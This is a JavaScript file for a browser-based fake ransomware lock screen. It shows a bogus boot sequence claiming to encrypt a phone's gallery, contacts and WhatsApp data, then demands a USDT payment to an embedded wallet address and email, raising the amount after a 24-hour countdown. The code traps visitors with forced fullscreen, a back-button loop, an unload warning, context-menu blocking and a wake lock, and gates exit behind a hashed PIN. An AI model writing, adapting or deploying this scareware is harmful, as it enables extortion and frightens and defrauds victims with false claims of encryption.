/* =========================================================
   CONFIG — edit these lines only
   ========================================================= */
const CONFIG = {
  address: "TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu",
  email:   "carolinawood2530@gmail.com",
  amount:  10,
  amountLate: 20,
  deadlineHours: 24,
  maxTries: 3,
  cooldown: 45,          // seconds
  key: "vlock_v1"
};

/* PIN 25302530 stored as a djb2 hash so it isn't plain text in source */
const PIN_HASH = "ad57559";
const hash = s => {
  let h = 5381;
  for (const c of s) h = ((h * 33) + c.charCodeAt(0)) >>> 0;
  return h.toString(16);
};

/* ========================================================= */
const $ = id => document.getElementById(id);
const lockEl = $("lock"), doneEl = $("done"), content = $("content"),
      boot = $("boot"), barfill = $("barfill"), bootpct = $("bootpct"),
      bootline = $("bootline"), pinEl = $("pin"), form = $("form"),
      goEl = $("go"), msg = $("msg"), clockEl = $("clock");

const read = () => { try { return JSON.parse(localStorage.getItem(CONFIG.key)) || {}; } catch { return {}; } };
const write = s => { try { localStorage.setItem(CONFIG.key, JSON.stringify(s)); } catch {} };

let state = read();
if (!state.firstSeen) { state.firstSeen = Date.now(); write(state); }
let locked = !state.unlocked;

/* device id flavour */
$("did").textContent = "TRX-" + hash(String(state.firstSeen)).toUpperCase().padEnd(6, "0");

/* ---------- boot sequence ---------- */
const LINES = [
  "scanning /storage/emulated/0 …",
  "mounting display controller …",
  "locking /data/media …",
  "encrypting gallery · 2,431 items",
  "encrypting contacts · 604 entries",
  "encrypting /sdcard/WhatsApp …",
  "sealing key in volatile memory …",
  "hook installed in boot layer ✓"
];

function runBoot() {
  let p = 0, i = 0;
  const tick = setInterval(() => {
    p = Math.min(100, p + Math.random() * 13 + 4);
    barfill.style.width = p + "%";
    bootpct.textContent = Math.floor(p) + "%";
    if (p > i * 12.5 && i < LINES.length) bootline.textContent = LINES[i++];
    if (p >= 100) {
      clearInterval(tick);
      setTimeout(() => {
        boot.classList.add("hidden");
        content.classList.remove("hidden");
        beep(160, 0.18);
      }, 380);
    }
  }, 190);
}

/* ---------- tiny audio ---------- */
let ac;
function beep(freq, dur, type = "square") {
  try {
    ac = ac || new (window.AudioContext || window.webkitAudioContext)();
    const o = ac.createOscillator(), g = ac.createGain();
    o.type = type; o.frequency.value = freq;
    g.gain.value = 0.05;
    o.connect(g); g.connect(ac.destination);
    o.start(); o.stop(ac.currentTime + dur);
  } catch {}
}

/* ---------- fullscreen + wake lock + escape traps ---------- */
async function goFull() {
  try {
    if (!document.fullscreenElement && document.documentElement.requestFullscreen) {
      await document.documentElement.requestFullscreen({ navigationUI: "hide" });
    }
  } catch {}
}

let wakeLock = null;
async function keepAwake() {
  try {
    if ("wakeLock" in navigator) {
      wakeLock = await navigator.wakeLock.request("screen");
      wakeLock.addEventListener("release", () => {});
    }
  } catch {}
}

if (locked) {
  runBoot();

  document.addEventListener("pointerdown", () => { goFull(); keepAwake(); }, { passive: true });
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden && locked) { goFull(); keepAwake(); }
  });

  /* back button prison */
  history.pushState({ lock: 1 }, "", location.href);
  window.addEventListener("popstate", () => {
    if (locked) history.pushState({ lock: 1 }, "", location.href);
  });

  /* leaving warning */
  window.addEventListener("beforeunload", e => {
    if (!locked) return;
    e.preventDefault();
    e.returnValue = "Device is encrypted. Reopen the link or the lock stays.";
  });

  /* block context menu + double tap zoom */
  document.addEventListener("contextmenu", e => e.preventDefault());
}

/* ---------- countdown ---------- */
function tickClock() {
  const end = state.firstSeen + CONFIG.deadlineHours * 3600e3;
  const left = Math.max(0, end - Date.now());
  const s = Math.floor(left / 1000);
  clockEl.textContent = [Math.floor(s / 3600), Math.floor(s / 60) % 60, s % 60]
    .map(n => String(n).padStart(2, "0")).join(":");
  if (left === 0 && !state.late) {
    state.late = true; write(state);
    $("amt").textContent = CONFIG.amountLate;
    $("late").classList.remove("hidden");
    $("mail").href = `mailto:${CONFIG.email}?subject=UNLOCK%20PIN%20REQUEST%20-%20${CONFIG.amountLate}%20USDT%20SENT`;
  }
}
if (locked) { tickClock(); setInterval(tickClock, 1000); }
if (state.late) {
  $("amt").textContent = CONFIG.amountLate;
  $("late").classList.remove("hidden");
}

/* ---------- copy ---------- */
$("copy").addEventListener("click", async () => {
  const btn = $("copy");
  try {
    await navigator.clipboard.writeText(CONFIG.address);
  } catch {
    const r = document.createRange();
    r.selectNodeContents($("addr"));
    const sel = getSelection(); sel.removeAllRanges(); sel.addRange(r);
  }
  btn.textContent = "COPIED";
  beep(880, 0.06, "sine");
  setTimeout(() => (btn.textContent = "COPY"), 1400);
});

/* ---------- pin ---------- */
let cooling = 0;

form.addEventListener("submit", e => {
  e.preventDefault();
  if (cooling) return;

  const v = pinEl.value.replace(/\D/g, "");
  if (v.length < 4) return fail("Enter the full PIN");

  if (hash(v) === PIN_HASH) {
    state.unlocked = true; state.unlockedAt = Date.now();
    write(state);
    locked = false;
    beep(1046, 0.1, "sine");
    setTimeout(() => beep(1568, 0.16, "sine"), 110);
    lockEl.classList.add("hidden");
    doneEl.classList.remove("hidden");
    if (document.fullscreenElement) document.exitFullscreen().catch(() => {});
    return;
  }

  state.tries = (state.tries || 0) + 1;
  if (state.tries >= CONFIG.maxTries) {
    state.tries = 0;
    write(state);
    startCooldown();
    fail(`Too many attempts — wait ${CONFIG.cooldown}s`);
  } else {
    write(state);
    fail(`Wrong PIN · ${CONFIG.maxTries - state.tries} attempt(s) left`);
  }
});

function fail(text) {
  msg.textContent = text;
  pinEl.value = "";
  pinEl.classList.remove("shake");
  void pinEl.offsetWidth;
  pinEl.classList.add("shake");
  beep(150, 0.16);
  setTimeout(() => beep(110, 0.22), 130);
}

function startCooldown() {
  cooling = CONFIG.cooldown;
  goEl.disabled = true;
  const iv = setInterval(() => {
    cooling--;
    if (cooling <= 0) {
      clearInterval(iv);
      goEl.disabled = false;
      goEl.textContent = "UNLOCK DEVICE";
      msg.textContent = "";
      return;
    }
    goEl.textContent = `LOCKED · ${cooling}s`;
  }, 1000);
  goEl.textContent = `LOCKED · ${cooling}s`;
}

/* ---------- relock ---------- */
function relock() {
  state.unlocked = false;
  write(state);
  location.reload();
}
$("relock").addEventListener("click", relock);
$("again").addEventListener("click", relock);

/* ---------- service worker ---------- */
if ("serviceWorker" in navigator) {
  window.addEventListener("load", () => {
    navigator.serviceWorker.register("sw.js").catch(() => {});
  });
    }
